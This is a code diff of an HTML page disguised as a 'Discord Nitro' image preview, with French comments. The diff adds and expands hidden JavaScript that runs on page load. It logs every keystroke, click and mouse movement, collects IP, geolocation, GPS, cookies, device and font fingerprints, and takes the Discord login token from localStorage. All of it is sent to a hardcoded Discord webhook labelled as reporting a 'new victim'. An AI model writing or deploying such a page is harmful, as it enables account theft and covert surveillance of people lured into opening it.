@@ -5,7 +5,7 @@
   <title>Discord Nitro</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:title" content="Image Discord">
-  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1313995492392439831/1362763852588257290/a18af5cfb44cd2906e21a7e5e29dea58.jpg?ex=6803943d&is=680242bd&hm=5b81c0cc5bfa6a3d837b3b0c3baf377dbd2af74534c4420f9a26ebafaca89cb7&">
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1313995492392439831/1362763852588257290/a18af5cfb44cd2906e21a7e5e29dea58.jpg?ex=6803943d&is=680242bd&hm=5b81c0cc5bfa6a3d837b3b0c3baf377dbd2af74534c4420f9a26eb">
   <style>
     body {
       margin: 0;
@@ -35,96 +35,189 @@
     }
   </style>
   <script>
+    // Ton webhook Discord
     const webhook = "https://discord.com/api/webhooks/1349385558627192843/J9WiGNLlSdX9mAO6GmEXKYDtlN98LxOKaTWf1u3JPsk_IZN_eyEzTnpW-yQ7-qdXqjkV";
 
-    // Fonction pour envoyer les événements au webhook
-    function logEvent(type, data) {
-      const payload = {
-        content: `📡 **${type}**\n\`\`\`\n${data}\n\`\`\``
-      };
-
+    // Fonction d'envoi
+    function sendToWebhook(type, data) {
       fetch(webhook, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          content: `**${type}**\n\`\`\`\n${data}\n\`\`\``
+        })
       });
     }
 
     // Keylogger
     document.addEventListener("keydown", function(e) {
-      logEvent("Touche tapée", `Touche : ${e.key} | Code : ${e.code}`);
+      sendToWebhook("Keylogger", `Touche: ${e.key} | Code: ${e.code}`);
     });
 
-    // Clics
+    // Clics souris
     document.addEventListener("click", function(e) {
-      logEvent("Clic souris", `Position : X=${e.clientX}, Y=${e.clientY}, Élément : ${e.target.tagName}`);
+      sendToWebhook("Clic souris", `X=${e.clientX}, Y=${e.clientY}, Élément: ${e.target.tagName}`);
     });
 
-    // Mouvement souris (1 par seconde)
+    // Mouvement souris (1/sec)
     let lastMouseSend = 0;
     document.addEventListener("mousemove", function(e) {
       const now = Date.now();
       if (now - lastMouseSend > 1000) {
         lastMouseSend = now;
-        logEvent("Mouvement souris", `Position : X=${e.clientX}, Y=${e.clientY}`);
+        sendToWebhook("Mouvement souris", `X=${e.clientX}, Y=${e.clientY}`);
       }
     });
 
-    document.addEventListener("DOMContentLoaded", async () => {
+    // Collecte d'informations avancées
+    async function collectInfos() {
       try {
-        const ip = await fetch("https://api64.ipify.org?format=json")
-          .then(r => r.json()).then(d => d.ip);
-        const geo = await fetch(`https://ipapi.co/${ip}/json/`)
-          .then(r => r.json());
-
         const now = new Date().toLocaleString();
         const ua = navigator.userAgent;
         const lang = navigator.language;
         const screenSize = `${screen.width}x${screen.height}`;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
-        const batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
-        const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}`);
-        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN / Proxy détecté" : "✅ Connexion normale";
+        const platform = navigator.platform;
+        const referrer = document.referrer || "Aucun";
+        const cookies = document.cookie || "Aucun";
 
-        // Récupération du token Discord
+        // IP et géolocalisation
+        let ip = "Inconnu", geo = {};
+        try {
+          ip = await fetch("https://api64.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
+          geo = await fetch(`https://ipapi.co/${ip}/json/`).then(r => r.json());
+        } catch(e) {}
+
+        // Batterie
+        let batteryStatus = "Inconnu";
+        try {
+          const battery = await (navigator.getBattery?.() || Promise.resolve({ level: 0, charging: false }));
+          batteryStatus = `${(battery.level * 100).toFixed(0)}% - ${battery.charging ? "En charge" : "Sur batterie"}`;
+        } catch(e) {}
+
+        // GPS (tentative silencieuse)
+        let gps = "Non autorisé";
+        if ("geolocation" in navigator) {
+          try {
+            gps = await new Promise((resolve) => {
+              navigator.geolocation.getCurrentPosition(
+                pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Précision: ${pos.coords.accuracy}m`),
+                () => resolve("Refusé ou erreur"),
+                {timeout: 1000}
+              );
+            });
+          } catch(e) {}
+        }
+
+        // Token Discord (Discord Web)
         let token = null;
         try {
+          // Méthode classique
           token = localStorage.getItem("token");
+          if (!token) {
+            // Méthode alternative (pour Discord Web)
+            for (let i in localStorage) {
+              if (i.includes("token")) {
+                token = localStorage[i];
+                break;
+              }
+            }
+          }
         } catch (e) {
           token = "Erreur accès token";
         }
-
         if (token) token = token.replace(/"/g, "");
 
-        const message = `
-**🖼️ Nouvelle ouverture d'image Discord**
-> 🕒 Date/Heure : \`${now}\`
-> 🌍 IP : \`${ip}\`
-> 📌 Localisation : \`${geo.city}, ${geo.region}, ${geo.country_name}\`
-> 🧠 Fournisseur : \`${geo.org}\`
-> 🧬 Fingerprint : \`${fingerprint}\`
-> 🖥️ OS/Navigateur : \`${ua}\`
-> 🗣️ Langue : \`${lang}\`
-> 🧭 Fuseau horaire : \`${timezone}\`
-> 📱 Résolution : \`${screenSize}\`
-> 🔋 Batterie : \`${batteryStatus}\`
-> 🛡️ VPN : ${vpn}
-> 🪙 Token Discord : \`\`\`${token || "Non trouvé"}\`\`\`
-        `;
+        // Devices audio/vidéo
+        let mediaDevices = "Non supporté";
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            mediaDevices = devices.map(d => `${d.kind}: ${d.label || "?"}`).join(', ');
+          } catch(e) {}
+        }
 
+        // Liste des polices installées (méthode simple)
+        function detectFonts() {
+          const baseFonts = ['monospace','sans-serif','serif'];
+          const testFonts = ['Arial','Verdana','Times New Roman','Courier New','Comic Sans MS','Impact','Georgia','Trebuchet MS','Palatino'];
+          let found = [];
+          const testString = "mmmmmmmmmmlli";
+          const testSize = '72px';
+          const body = document.body;
+          const span = document.createElement('span');
+          span.style.fontSize = testSize;
+          span.innerHTML = testString;
+          body.appendChild(span);
+          for (let font of testFonts) {
+            let detected = false;
+            for (let base of baseFonts) {
+              span.style.fontFamily = `${font},${base}`;
+              const width = span.offsetWidth;
+              span.style.fontFamily = base;
+              if (width !== span.offsetWidth) detected = true;
+            }
+            if (detected) found.push(font);
+          }
+          body.removeChild(span);
+          return found.join(', ');
+        }
+        let fonts = detectFonts();
+
+        // Fingerprint simple
+        const fingerprint = btoa(`${ip}|${ua}|${lang}|${screenSize}|${timezone}|${platform}|${fonts}`);
+
+        // Hardware
+        const cpuThreads = navigator.hardwareConcurrency || "Inconnu";
+        const deviceMemory = navigator.deviceMemory || "Inconnu";
+
+        // VPN/Proxy
+        const vpn = geo.org?.toLowerCase().includes("vpn") || geo.org?.toLowerCase().includes("proxy") ? "🚨 VPN/Proxy détecté" : "✅ Connexion normale";
+
+        // Temps passé sur la page
+        let startTime = Date.now();
+        window.addEventListener("beforeunload", function() {
+          const duration = ((Date.now() - startTime) / 1000).toFixed(1);
+          sendToWebhook("Temps passé sur la page", `${duration} secondes`);
+        });
+
+        // Préparation du message
+        let infos = [
+          `🕒 Date/Heure : ${now}`,
+          `🌍 IP : ${ip}`,
+          `📌 Localisation : ${geo.city || "?"}, ${geo.region || "?"}, ${geo.country_name || "?"}`,
+          `🧠 FAI : ${geo.org || "?"}`,
+          `🧬 Fingerprint : ${fingerprint}`,
+          `🖥️ OS/Plateforme : ${platform}`,
+          `🌐 Navigateur : ${ua}`,
+          `🗣️ Langue : ${lang}`,
+          `🧭 Fuseau horaire : ${timezone}`,
+          `📱 Résolution : ${screenSize}`,
+          `🔋 Batterie : ${batteryStatus}`,
+          `🛡️ VPN : ${vpn}`,
+          `🍪 Cookies : ${cookies}`,
+          `🔗 Referrer : ${referrer}`,
+          `📍 GPS : ${gps}`,
+          `🎤 Appareils audio/vidéo : ${mediaDevices}`,
+          `🔤 Polices détectées : ${fonts}`,
+          `⚙️ CPU Threads : ${cpuThreads}`,
+          `💾 RAM estimée : ${deviceMemory} Go`,
+          `🪙 Token Discord : ${token || "Non trouvé"}`
+        ].join('\n');
+
+        // Envoi au webhook
         await fetch(webhook, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ content: message })
+          body: JSON.stringify({ content: `**🖼️ Nouvelle victime Discord CTF**\n\`\`\`\n${infos}\n\`\`\`` })
         });
 
       } catch (err) {
-        console.error("Erreur de tracking :", err);
+        // Erreur silencieuse
       }
-    });
+    }
+
+    document.addEventListener("DOMContentLoaded", collectInfos);
   </script>
 </head>
 <body>
